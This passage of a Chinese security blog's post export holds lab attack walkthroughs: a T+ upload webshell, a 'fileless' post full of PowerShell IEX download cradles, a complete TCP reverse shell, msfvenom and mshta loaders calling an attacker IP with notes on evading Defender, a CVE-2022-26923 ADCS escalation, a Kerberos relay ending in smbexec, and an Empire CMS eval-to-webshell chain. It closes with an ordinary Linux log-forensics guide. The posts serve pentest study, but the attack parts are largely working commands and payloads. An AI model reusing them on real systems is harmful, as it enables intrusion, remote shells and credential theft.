4.3目录穿越漏洞因为代码获取文件名时是用\\\\来分割的，所以将文件名用&#x2F;分割就可以绕过分割，从而造成目录穿越 5上传WEBSHELL既然知道了漏洞利用条件，那么就可以尝试上传WEBSHELL了 先调整一下poc 1234&lt;form action=&quot;http://192.168.100.42/tplus/SM/SetupAccount/Upload.aspx?preload=1&quot; name=&quot;form1&quot; id=&quot;form1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input name=&quot;File1&quot; type=&quot;file&quot; id=&quot;File1&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;上 传&quot;&gt;&lt;/form&gt; 上传哥斯拉马 上传成功，服务器上已经有了文件 直接访问文件会报错，报错提示没有预编译。 5.1预编译aspx1C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe -v \\ -p C:\\Users\\user\\Desktop\\1 C:\\Users\\user\\Desktop\\2 预编译需要用到aspnet_compiler.exe，这个是Microsoft.NET中附带的。这里成功预编译了冰蝎马。 5.2上传预编译之后的aspx上传compiled 上传dll 上传aspx 冰蝎连接成功","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://mrwq.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"0day","slug":"0day","permalink":"https://mrwq.github.io/tags/0day/"}]},{"title":"常见无文件落地攻击方法总结","path":"常见无文件落地攻击方法总结/","text":"1.概述“无文件攻击”（Fileless）属于一种影响力非常大的安全威胁。攻击者在利用这种技术实施攻击时，不会在目标主机的磁盘上写入任何的恶意文件，因此而得名“无文件攻击”。现在挖矿病毒、勒索病毒多采用无文件攻击方式，从而可绕过常规杀毒软件的防护。 当我们拿到一个shell但是想上线CS或者MSF时，无文件落地上线会是一个更高明的选择。 2.PowerShell无文件攻击powershell做为微软windows系统自带的软件包，具有十分强大的功能，越来越多的攻击者选用powershell做为攻击手段。PowerShell的主要作用是从远程位置下载恶意文件到受害者主机中，然后使用诸如Start-Porcess、Invoke-Item或者Invoke-Expression（-IEX）之类的命令执行恶意文件，PowerShell也可以将远程文件直接下载到受害者主机内存中，然后从内存中执行。 1.PowerShell内存加载EXE程序 将exe二进制转换为base64字符串 生成对应exe、dll、c格式的shellcode,这里用cobaltstrike生成。然后用python开启http服务。 将文件二进制转换为字符串的powershell脚本，命名为Convert-BinaryToString.ps1 123456789101112131415161718function Convert-BinaryToString &#123; [CmdletBinding()] param ( [string] $FilePath ) try &#123; $ByteArray = [System.IO.File]::ReadAllBytes($FilePath); &#125; catch &#123; throw &quot;Failed to read file. Ensure that you have permission to the file, and that the file path is correct.&quot;; &#125; if ($ByteArray) &#123; $Base64String = [System.Convert]::ToBase64String($ByteArray); &#125; else &#123; throw &#x27;$ByteArray is $null.&#x27;; &#125; Write-Output -InputObject $Base64String;&#125; 或者python实现的同样脚本，命名为Convert-BinaryToString.py 12345678910import sysimport base64if len(sys.argv) &gt; 1: file_path = sys.argv[1] with open(file_path, &#x27;rb&#x27;) as f: file_content = f.read() base64_string = base64.b64encode(file_content).decode() print(base64_string)else: print(&quot;Convert-BinaryToString.py xxx.exe&quot;) python3 Convert-BinaryToString.py artifact.exe &gt; artifact.exe.txt 在脚本末尾追加以下内容 https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 修改Invoke-ReflectivePEInjection.ps1脚本，在末尾添加如下内容，然后重命名为runexe.ps1 123$InputString = &#x27;二进制文件转换之后的base64字符串&#x27;$PEBytes = [System.Convert]::FromBase64String($InputString) # 将字符串还原为二进制Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR # 在内存中运行 EXE 在其他机器上加载并允许powershell脚本 1powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.100.11:8000/runexe.ps1&#x27;)&quot; 坑点1:运行之后powershell停止工作。 ​ 然后换用MSF之后，用同样的方法，先用MSFvenom生成exe，然后使用Convert-BinaryToString将exe转换为base64字符串，再讲字符串替换掉runexe.ps1中CS的字符串，然后再目标机器上允许之后，就成功上线了。同样的操作，CS不行，MSF就可以。有没有懂哥可以解释一下的。 坑点2：同样的powershell脚本，win7中可以正常上线MSF，win10就不行。win10一开始是defender给拦截了，关闭defender之后一堆爆红，然后也不上线。 2.PowerShell内存加载DLL与内存加载exe一样操作，将dll先转换为base64字符串，然后修改Invoke-ReflectivePEInjection.ps1脚本，在末尾添加执行命令。 123$InputString = &#x27;二进制文件转换之后的base64字符串&#x27;$PEBytes = [System.Convert]::FromBase64String($InputString) # 将字符串还原为二进制Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR # 在内存中运行 EXE 在其他机器上加载并允许powershell脚本 1powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.100.11:8000/rundll.ps1&#x27;)&quot; 然后得到了同样的结果。MSF生成的DLL可以正常上线，CS生成的DLL不行。win7可以正常上线，win10不行。而且相比内存加载EXE，内存加载DLL不会有DEP的警告。 3.远程加载并执行DLL在powersploit的以前项目（https://github.com/clymb3r/PowerShell）上，发现了同名脚本Invoke-ReflectivePEInjection.ps1，这个脚本是支持远程加载pe到内存中执行的。对应参数是PEUrl。 在其他机器上执行 1powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.100.11:8000/Invoke-ReflectivePEInjection.old.ps1&#x27;);Invoke-ReflectivePEInjection -PEUrl http://192.168.100.11:8000/shell.dll&quot; 可以从http日志中看到，先是下载了Invoke-ReflectivePEInjection.old.ps1，然后又下载了shell.dll。同时MSF成功上线。 win7可以正常上线，win10同样报错。MSF生成的DLL可以正常上线，CS生成的DLL不行。 4.远程加载并执行EXE与上面同样方法，只需要修改PEUrl参数，将dll的url换成exe的url。 1powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.100.11:8000/Invoke-ReflectivePEInjection.old.ps1&#x27;);Invoke-ReflectivePEInjection -PEUrl http://192.168.100.11:8000/shell.exe&quot; 可以从http日志中看到，先是下载了Invoke-ReflectivePEInjection.old.ps1，然后又下载了exe。但是只要MSF上线。 CS生成的exe还是一如既往的报错，MSF的虽然也报错了，但是正常上线了。 5.进程注入shellcode在powersploit项目中同时还提供了进程注入shellcode的脚本Invoke-Shellcode.ps1（https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1） 1.将生成的shell.c和artifact.c修改为16进制格式。 2.将Invoke-Shellcode.ps1复制到kali上，然后分别重命名为Invoke-Shellcode-shell.ps1和Invoke-Shellcode-artifact.ps1。 在ps1脚本底部添加如下内容 1Invoke-Shellcode -Shellcode @(16进制shellcode) 3.在其他机器上执行 123powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.100.11:8000/Invoke-Shellcode-shell.ps1&#x27;)&quot; //Invoke-Shellcode-shell.ps1脚本中放入shell.c的shellcode，shell.c是MSF生成的。powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.100.11:8000/Invoke-Shellcode-artifact.ps1&#x27;)&quot; //Invoke-Shellcode-artifact.ps1脚本中放入artifact.c的shellcode，artifact.c是CS生成的。 CS和MSF均正常上线 Win7正常上线，Win10依旧报错。 6.CS生成PowerShell上线脚本用CS自带的web 1powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.100.11:80/a&#x27;))&quot; win10和win7均可正常上线。 7.MSF生成PowerShell上线脚本msfvenom生成powershell上线脚本 1msfvenom -p windows/x64/meterpreter/reverse_tcp -f psh-reflection -o shell.ps1 python开启http服务，然后在windows执行 1powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.100.11:8000/shell.ps1&#x27;)&quot; 结果，win7和win10均可正常上线。 3.python无文件攻击3.1.CS生成python无文件攻击 1python2 -c &quot;import urllib2; exec urllib2.urlopen(&#x27;http://192.168.100.11:80/python&#x27;).read();&quot; win10和win7可以正常上线，然后比较神奇的是defender没有任何反应。意外发现一种免杀新思路？ 3.2.MSF生成python无文件攻击msfvenom生成powershell上线脚本 1msfvenom -p windows/x64/meterpreter/reverse_tcp -f python-reflection -o shell.py python开启http服务，然后在windows执行 1python2 -c &quot;import urllib2; exec urllib2.urlopen(&#x27;http://192.168.100.11:8000/shell.py&#x27;).read();&quot; 结果，win7和win10均可正常上线。 4.Mshta.exe无文件攻击HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，与VB、C++等程序语言所设计的软件界面没什么差别。 大多数的Windows操作系统都支持Hta文件执行，利用Mshta.exe解析.hta文件执行，这里的.hta文件可以是本地的也可以是可访问的远程主机上的。 HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多。它具有桌面程序的所有权限（读写文件、操作注册表等）。HTA本来就是被设计为桌面程序的。 例如： 123456789&lt;html&gt;&lt;head&gt;&lt;script&gt;s = new ActiveXObject(&quot;WScript.Shell&quot;);s.run(&quot;%windir%\\\\System32\\\\cmd.exe /c calc.exe&quot;, 0);window.close();&lt;/script&gt;&lt;/head&gt;&lt;/html&gt; 保存为HTA文件后就可以打开 执行后会弹出计算器。 将以上代码保存为calc.hta，然后放在kali上开启http服务。再在windows上执行以下命令，就可以在windows上弹出计算器。 1mshta http://192.168.100.11:8000/calc.hta 查看http日志可以看到hta被访问了。 利用MSHTA的以上特性就可以实现无文件落地攻击。 4.1.自定义反弹shell在hta中命令执行弹计算器的位置修改为如下反弹shell的powershell命令。 1powershell -nop -c \\&quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;192.168.100.11&#x27;,9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()\\&quot; 然后在windows上执行以下命令，就可以获得shell。 1mshta http://192.168.100.11:8000/calc.hta 同理将，hta中命令执行弹计算器的位置修改为上文中的任意方法，即可无文件落地获得CS或者MSFshell。 比如下图改成python的上线代码，可以成功上线MSF。 4.2.MSF生成hta除了自定义命令外，MSF还可以使用msfvenom生成hta文件。 1msfvenom -p windows/x64/meterpreter/reverse_tcp -f hta-psh -o shell.hta python开启http服务，然后在windows执行 1mshta http://192.168.100.11:8000/shell.hta 查看shell.hta的文件内容，可以发现是powershell的上线命令。 当然win10与win7都可正常上线。但是会被defender给杀掉。 4.3.CS生成hta生成HTA文档evil.hta python开启http服务，然后在windows执行 1mshta http://192.168.100.11:8000/evil.hta 当然win10与win7都可正常上线。但是会被defender给杀掉。 5.总结powershell的无文件落地虽然方法比较多，但是都是通过反射来实现的。反射型dll注入与常规注入有何不同：反射型dll注入直接在内存中展开，无需.dll 文件存在。没有通过Load Library等API加载，ProcessExplorer、procexp64 等工具无法检测到这个dll，更容易免杀。 python不是windows自带的所以python无文件落地攻击并不通用，而且受限于exec关键字，目前只有python2可以正常执行。或许有python3执行的方法，可以在研究下，而且用python无文件落地还可以绕过defender，似乎是一种免杀的新思路。 mshta.exe是一种比较稳定的无文件攻击，但是因为其稳定高效的优点也被杀软盯上了，免杀效果并不好。","tags":[{"name":"总结","slug":"总结","permalink":"https://mrwq.github.io/tags/%E6%80%BB%E7%BB%93/"},{"name":"无文件落地","slug":"无文件落地","permalink":"https://mrwq.github.io/tags/%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0/"}]},{"title":"CVE-2022-26923域权限提升漏洞复现","path":"CVE-2022-26923域权限提升漏洞复现/","text":"本文首发于蛇矛实验室：https://mp.weixin.qq.com/s/AuPajld1K7N5alAkgMZNfA 环境搭建域控选择一台winserver2016搭建域控服务，这里是winserver2016。选择Active Directory域服务，其他默认即可。 安装完成之后，提升为域控制器，开始配置域控。 添加新林rangenet.cn，其他默认，然后一步步到安装完成。 ADCS搭建下面正式开始安装ADCS服务，只需要注意下面截图的内容，其他都是默认。 服务器管理器–&gt;添加角色和功能向导–&gt;勾选服务器角色–&gt;Active Director 证书服务 开始安装 配置ADCS服务，只需要注意下面截图的内容，其他都是默认。 新建低权限AD用户创建低权限AD用户Zhangfei：ZFpassword@123 工具https://github.com/SecureAuthCorp/impacket https://github.com/ly4k/Certipy https://github.com/CravateRouge/bloodyAD 测试复现配置 DNS修改kali的&#x2F;etc&#x2F;hosts文件并添加以下条目： 域内定位CA机器在域内机器上执行，为了方便这里在域控中执行 certutil -config - -ping 测试证书生成首先使用用户证书模板为我们的低权限AD用户 (Username&#x3D;zhangfeiPassword&#x3D;ZFpassword@123) 生成证书： certipy req ‘rangenet.cn&#x2F;zhangfei:ZFpassword@123@dc.rangenet.cn’ -caRANGENET-DC-CA -template User 验证此证书是否有效 certipy auth -pfx zhangfei.pfx 创建机器账户到域我们需要向域中添加一台新计算机以生成机器证书。我们不必将物理计算机添加到网络中。我们可以使用Impacket的addcomputer.py脚本让它看起来像我们正在添加一台新计算机： addcomputer.py ‘rangenet.cn&#x2F;zhangfei:ZFpassword@123’ -method LDAPS-computer-name ‘zhangfeiPC’ -computer-pass ‘ZFpassword@123’ 参数说明： Rangenet.cn&#x2F;zhangfei:ZFpassword@123 有效的 AD 凭据才能添加新计算机。 Method 身份验证方法。LDAPS 将与域控制器上的 LDAP 服务交互。 computer-name 计算机的名称,可以随便起。 computer-pass 与我计算机的机器帐户关联的密码。也可以随便起。 请求机器证书们创建的新计算机生成一个证书。要使用该计算机的机器帐户，您需要在名称末尾添加一个“$”： certipy req ‘rangenet.cn&#x2F;zhangfeiPC$:ZFpassword@123@dc.rangenet.cn’ -caRANGENET-DC-CA -template Machine Certipy验证证书是否有效,获取到哈希，证明有效： certipy auth -pfx zhangfeipc.pfx 更新 DNS 主机名和 SPN 属性使用Get-ADCompute命令查看AD对象中DNS主机名和SPN： 首先删除我们当前的 SPN 属性： Set-ADComputer zhangfeiPC -ServicePrincipalName @{} 使用Set-ADComputer cmdlet将DNS主机名属性更新为DC的属性 Set-ADComputer zhangfeiPC -DnsHostName DC.rangenet.cn 验证是否进行了更改,可以看到已经成功更改DNSHostName为dc.rangenet.cn： 伪造恶意证书再次运行Certipy的相同命令来重新生成机器证书，可以看到DNS HostName已经变成了dc.rangenet.cn： certipy req ‘rangenet.cn&#x2F;zhangfeiPC$:ZFpassword@123@dc.rangenet.cn’ -caRANGENET-DC-CA -template Machine 再次验证证书是否有效，成功获取到哈希： 转储所有用户哈希这里使用impacket的secretsdump.py来dump哈希 攻击复现配置 DNS修改kali的&#x2F;etc&#x2F;hosts文件并添加以下条目： 域内定位CA机器在域内机器上执行，为了方便这里在域控中执行 certutil -config - -ping 测试证书生成首先使用用户证书模板为我们的低权限AD用户 (Username&#x3D;zhangfeiPassword&#x3D;ZFpassword@123) 生成证书： certipy req ‘rangenet.cn&#x2F;zhangfei:ZFpassword@123@dc.rangenet.cn’ -caRANGENET-DC-CA -template User 验证此证书是否有效 certipy auth -pfx zhangfei.pfx 创建机器账户到域使用bloodyAD工具来创建机器账户。 查看ms-DS-MachineAccountQuota属性，如果ms-DS-MachineAccountQuota&gt;0就可以创建机器帐户 在LDAP中创建一个机器帐户 更新机器帐户的DNS HostName将机器帐户的DNS Host Name改为域控的DC.rangenet.cn 查看属性，是否成功更改了DNS Host Name 伪造恶意证书运行Certipy来重新生成机器证书，可以看到DNS Host Name已经变成了dc.rangenet.cn： certipy req ‘rangenet.cn&#x2F;zhangfeiPC$:ZFpassword@123@dc.rangenet.cn’ -caRANGENET-DC-CA -template Machine 再次验证证书是否有效，成功获取到哈希： 转储所有用户哈希这里使用impacket的secretsdump.py来dump哈希","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://mrwq.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://mrwq.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"kerberos中继攻击","path":"kerberos中继攻击/","text":"环境搭建 DC ip：192.168.21.2 域名：DC.rangenet.com ADCS ip：192.168.21.3 域名：adcs.rangenet.com 一台win10域成员 ip：192.168.21.4 域名win10.rangenet.com 攻击机kali ip：192.168.21.10 DC搭建选择一台winserver搭建adcs服务，这里是winserver2016。选择Active Directory 域服务，其他默认即可。 安装完成之后，提升为域控制器，开始配置域控。 添加新林rangenet.com，其他默认，然后一步步到安装。 ADCS搭建选择一台winserver搭建adcs服务，这里是winserver2016。然后先将这台server加入到rangenet.com域中 重启之后，使用域控账号登录（因为要安装ADCS服务需要登陆账号属于Enterprise Admins组，为了方便这里使用域控账号登录） 下面正式开始安装ADCS服务，只需要注意下面截图的内容，其他都是默认。 服务器管理器–&gt;添加角色和功能向导–&gt;勾选服务器角色–&gt;Active Director 证书服务 开始安装 配置ADCS服务，只需要注意下面截图的内容，其他都是默认。 访问http://localhost/certsrv出现登录框 输入系统账号即可进入，出现下面界面，表示安装成功。 Kerberos中继攻击Kali中添加域控ip为dns 改完后ping一下域成员，能ping通即可 开始攻击 使用mitm6监听DHCPV6请求。 Mitm6 –domain rangenet.com –host-allowlist win10.rangenet.com –relay adcs.rangenet.com -v –domain 是要攻击的域名 –host-allowlist是过滤win10这台机器的请求 –relay是转发请求的地址，这里填adcs地址 使用krbrelays.py中继kerberos协议. Pyhton3 krbrelayx.py –target http://adcs.rangenet.com/certsrv/ -ip 192.168.21.10 –victim win10.rangenet.com –adcs –template Machine –target 是adcs证书服务的url地址 -ip是当前ip（内网中控制的机器，这里把kali直接放在内网中了） –victim是受害者域名 然后重启win10，当win10成员机获取网络连接时会发出DHCPv6请求的包，以便mitm6可以接管DHCPv6请求。 Krbrelax.py成功中继到证书 证书太长，把证书复制到文件里，方便复制全证书 接下来使用证书去向域控获取tgt，我们使用gettgtpkinit.py来模拟这个过程。 python gettgtpkinit.py -pfx-base64 一大串证书 rangenet.com&#x2F;win10$ win10.ccache 报下面截图的错是因为时钟问题，DC的时间太落后了，调回正常时间即可。 下面成功获取到tgt票据 接下来请求管理员票据 python gets4uticket.py kerberos+ccache:&#x2F;&#x2F;rangenet.com\\win10$:win10.ccache@DC主机名.rangenet.com cifs&#x2F;&#x77;&#105;&#110;&#x31;&#x30;&#x2e;&#x72;&#97;&#x6e;&#x67;&#x65;&#x6e;&#x65;&#116;&#x2e;&#x63;&#x6f;&#109;&#x40;&#114;&#97;&#x6e;&#103;&#101;&#110;&#101;&#x74;&#x2e;&#x63;&#111;&#109; &#65;&#100;&#109;&#105;&#x6e;&#105;&#x73;&#x74;&#x72;&#x61;&#x74;&#111;&#x72;&#x40;&#114;&#x61;&#110;&#x67;&#x65;&#110;&#x65;&#x74;&#x2e;&#99;&#x6f;&#x6d; admin.ccache DC主机名在mitm6处理的请求中可以找到 然后就可以使用管理员票据去登录机器了 KRB5CCNAME&#x3D;admin.ccache python ..&#x2F;impacket&#x2F;examples&#x2F;smbexec.py -k rangenet.com&#x2F;&#x41;&#100;&#x6d;&#x69;&#110;&#x69;&#x73;&#x74;&#114;&#97;&#116;&#111;&#x72;&#x40;&#x77;&#x69;&#110;&#x31;&#48;&#46;&#x72;&#x61;&#110;&#103;&#101;&#110;&#101;&#116;&#x2e;&#99;&#111;&#109; -no-pass","tags":[{"name":"kerberos","slug":"kerberos","permalink":"https://mrwq.github.io/tags/kerberos/"},{"name":"中继","slug":"中继","permalink":"https://mrwq.github.io/tags/%E4%B8%AD%E7%BB%A7/"}]},{"title":"帝国CMS审计-后台模板注入导致getshell","path":"帝国CMS审计-后台模板注入导致getshell/","text":"本文首发于奇安信攻防社区：https://forum.butian.net/share/471第一次尝试自己审计代码，小白一个。审计了好长时间，终于皇天不负有心人，找到一处模板注入，最终发现一处代码执行。 审计过程： 采用关键函数溯源法来找的。全局搜索eval函数在e&#x2F;class&#x2F;connect.php 代码如图所示，能否利用这个eval函数，关键点在于$listtemp和$docode 然后全局搜索ReplaceListVars函数，找的使用这个函数的功能点，在e&#x2F;search&#x2F;result&#x2F;index.php中发现使用了这个函数。如图 从这里开始再进行回溯，查看参数是否可控。可以看到$listvar和$docode都是从$tempr中得到的，所以回溯$tempr 可以看到$tempr是从数据库中查询得到的，执行哪条查询语句关键在于$search_r[‘tempid’] 再回溯$search_r，可以看到$search_r是从数据库查询到的。 我们连接数据库执行查询，看看这个sql的执行结果。 可以看到tempid为1。所以$tempr是执行第一条sql语句查询出来的。这里再执行第一条sql看看 如图，listvar就是可以放到eval中执行的字符串，而modid就是控制能否执行eval的$docode。将过程反过来看就是漏洞成因。 而要利用这个漏洞还差一个条件，就是参数可控。所以接下来要找可以插入数据在这里的函数。 全局搜索第一条sql的数据库关键字，在ListSearchtemp.php中发现insert，可以确定这里是新增的地方。 在web中找到该页面。可以看到这里显示的模板名称跟之前用sql查询的名字一样，所以可以确定这里就是新增的地方。从页面功能可以看出可以新增和修改，所以eval函数的参数可控。 漏洞利用： 修改类别内容为phpinfo，同时勾选上使用程序代码。 然后从首页底部的搜索功能，到&#x2F;e&#x2F;search&#x2F;result&#x2F;index.php 用file_put_contents函数写入一句话木马payload，然后连接蚁剑： file_put_contents(‘test1.php’,’‘);","tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://mrwq.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Linux日志总结","path":"Linux日志总结/","text":"本文首发于奇安信攻防社区：https://forum.butian.net/share/379 Linux日志简介Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 Linux 日志都以明文形式存储，所以用户不需要特殊的工具就可以搜索和阅读它们。还可以编写脚本，来扫描这些日志，并基于它们的内容去自动执行某些功能。Linux 日志存储在 &#x2F;var&#x2F;log 目录中。这里有几个由系统维护的日志文件，但其他服务和程序也可能会把它们的日志放在这里。大多数日志只有root账户才可以读，不过修改文件的访问权限就可以让其他人可读。 日志文件日志默认存放位置：&#x2F;var&#x2F;log&#x2F; 查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf 日志文件 说明 &#x2F;var&#x2F;log&#x2F;boot.log 记录了系统在引导过程中发生的事件，就是Linux系统开机自检过程显示的信息。 &#x2F;var&#x2F;log&#x2F;syslog 默认RedHat Linux不生成该日志文件，但可以配置&#x2F;etc&#x2F;syslog.conf让系统生成该日志文件。它和&#x2F;etc&#x2F;log&#x2F;messages日志文件不同，它只记录警告信息，常常是系统出问题的信息，所以更应该关注该文件。 &#x2F;var&#x2F;log&#x2F;cron 该日志文件记录crontab守护进程crond所派生的子进程的动作，前面加上用户、登录时间和PID，以及派生出的进程的动作。CMD的一个动作是cron派生出一个调度进程的常见情况。REPLACE（替换）动作记录用户对它的cron文件的更新，该文件列出了要周期性执行的任务调度。RELOAD动作在REPLACE动作后不久发生，这意味着cron注意到一个用户的cron文件被更新而cron需要把它重新装入内存。该文件可能会查到一些反常的情况。 &#x2F;var&#x2F;log&#x2F;cups 记录打印信息的日志 &#x2F;var&#x2F;log&#x2F;dmesg 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 &#x2F;var&#x2F;log&#x2F;mailog 记录了每一个发送到系统或从系统发出的电子邮件的活动。它可以用来查看用户使用哪个系统发送工具或把数据发送到哪个系统。 &#x2F;var&#x2F;log&#x2F;message 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 &#x2F;var&#x2F;log&#x2F;btmp 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 &#x2F;var&#x2F;log&#x2F;lastlog 该日志文件记录最近成功登录的事件和最后一次不成功的登录事件，由login生成。在每次用户登录时被查询，该文件是二进制文件，需要使用lastlog命令查看，根据UID排序显示登录名、端口号和上次登录时间。如果某用户从来没有登录过，就显示为”*Never logged in*”。该命令只能以root权限执行。 &#x2F;var&#x2F;log&#x2F;wtmp 该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件。因此随着系统正常运行时间的增加，该文件的大小也会越来越大，增加的速度取决于系统用户登录的次数。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前显示用户的登录记录，last也能根据用户、终端 tty或时间显示相应的记录。 &#x2F;var&#x2F;log&#x2F;utmp 该日志文件记录有关当前登录的每个用户的信息。因此这个文件会随着用户登录和注销系统而不断变化，它只保留当时联机的用户记录，不会为用户保留永久的记录。系统中需要查询当前用户状态的程序，如 who、w、users、finger等就需要访问这个文件。该日志文件并不能包括所有精确的信息，因为某些突发错误会终止用户登录会话，而系统没有及时更新 utmp记录，因此该日志文件的记录不是百分之百值得信赖的。 &#x2F;var&#x2F;log&#x2F;secure 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 &#x2F;var&#x2F;log&#x2F;xferlog 该日志文件记录FTP会话，可以显示出用户向FTP服务器或从服务器拷贝了什么文件。该文件会显示用户拷贝到服务器上的用来入侵服务器的恶意程序，以及该用户拷贝了哪些文件供他使用。 &#x2F;var&#x2F;log&#x2F;kernlog RedHat Linux默认没有记录该日志文件。要启用该日志文件，必须在&#x2F;etc&#x2F;syslog.conf文件中添加一行：kern.* &#x2F;var&#x2F;log&#x2F;kernlog 。这样就启用了向&#x2F;var&#x2F;log&#x2F;kernlog文件中记录所有内核消息的功能。该文件记录了系统启动时加载设备或使用设备的情况。一般是正常的操作，但如果记录了没有授权的用户进行的这些操作，就要注意，因为有可能这就是恶意用户的行为。 （&#x2F;var&#x2F;log&#x2F;wtmp、&#x2F;var&#x2F;run&#x2F;utmp、&#x2F;var&#x2F;log&#x2F;lastlog）是日志子系统的关键文件，都记录了用户登录的情况。这些文件的所有记录都包含了时间戳。这些文件是按二进制保存的，故不能用less、cat之类的命令直接查看这些文件，而是需要使用相关命令通过这些文件而查看。其中，utmp和wtmp文件的数据结构是一样的，而lastlog文件则使用另外的数据结构，关于它们的具体的数据结构可以使用man命令查询。 who：who命令查询utmp文件并报告当前登录的每个用户。Who的缺省输出包括用户名、终端类型、登录日期及远程主机 w：w命令查询utmp文件并显示当前系统中每个用户和它所运行的进程信息 users：users用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名把显示相同的次数 last：last命令往回搜索wtmp来显示自从文件第一次创建以来登录过的用户 日志优先级 级别 英文单词 中文释义 说明 0 EMERG 紧急 会导致主机系统不可用的情况。紧急情况，系统不可用（例如系统崩溃），一般会通知所有用户。 1 ALERT 警告 必须马上采取措施解决的问题。需要立即修复，例如系统数据库损坏。 2 CRIT 严重 比较严重的情况。危险情况，例如硬盘错误，可能会阻碍程序的部分功能。 3 ERR 错误 运行出现错误 4 WARNING 提醒 可能影响系统功能，需要提醒用户的重要事件 5 NOTICE 注意 不会影响正常功能，但是需要注意的事件 6 INFO 信息 一般信息 7 DEBUG 调试 程序或系统调试信息等 比较重要的几个日志后面是查看的命令 1234567登录失败记录：/var/log/btmp //lastb 最后一次登录：/var/log/lastlog //lastlog 登录成功记录: /var/log/wtmp //last 目前登录用户信息：/var/run/utmp //w、who、users登录日志记录：/var/log/secure 历史命令记录：history 仅清理当前用户：history -c 常用检查命令Linux下常用的shell命令如：find、grep 、egrep、awk、sed grep显示前后几行信息 123456标准unix/linux下的grep通过下面參数控制上下文：grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行grep -B 5 foo file 显示foo及前5行grep -A 5 foo file 显示foo及后5行查看grep版本号的方法是grep -V grep 查找含有某字符串的所有文件 123456grep -rn &quot;hello,world!&quot; * : 表示当前目录所有文件，也可以是某个文件名-r 是递归查找-n 是显示行号-R 查找所有文件包含子目录-i 忽略大小写 显示一个文件的某几行 12cat input_file | tail -n +1000 | head -n 2000#从第1000行开始，显示2000行。即显示1000~2999行 系统完整性 通过 rpm 自带的 -Va 来校验检查所有的 rpm 软件包，查看哪些命令是否被替换了 123456789101112rpm -Va &gt; rpm.log# 如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。验证内容中的8个信息的具体内容如下：- S 文件大小是否改变- M 文件的类型或文件的权限（rwx）是否被改变- 5 文件MD5校验是否改变（可以看成文件内容是否改变）- D 设备中，从代码是否改变- L 文件路径是否改变- U 文件的属主（所有者）是否改变- G 文件的属组是否改变- T 文件的修改时间是否改变 查看对外开放端口 123456ss -tnlpss -tnlp | grep sshss -tnlp | grep &quot;:22&quot;netstat -tnlpnetstat -tnlp | grep ssh 防火墙 123456789firewall-cmd --state # 显示防火墙状态firewall-cmd --get-zones # 列出当前有几个 zonefirewall-cmd --get-active-zones # 取得当前活动的 zonesfirewall-cmd --get-default-zone # 取得默认的 zonefirewall-cmd --get-service # 取得当前支持 servicefirewall-cmd --get-service --permanent # 检查下一次重载后将激活的服务firewall-cmd --zone=public --list-ports # 列出 zone public 端口firewall-cmd --zone=public --list-all # 列出 zone public 当前设置 用户 12345awk -F: &#x27;&#123;if($3==0||$4==0)print $1&#125;&#x27; /etc/passwd # 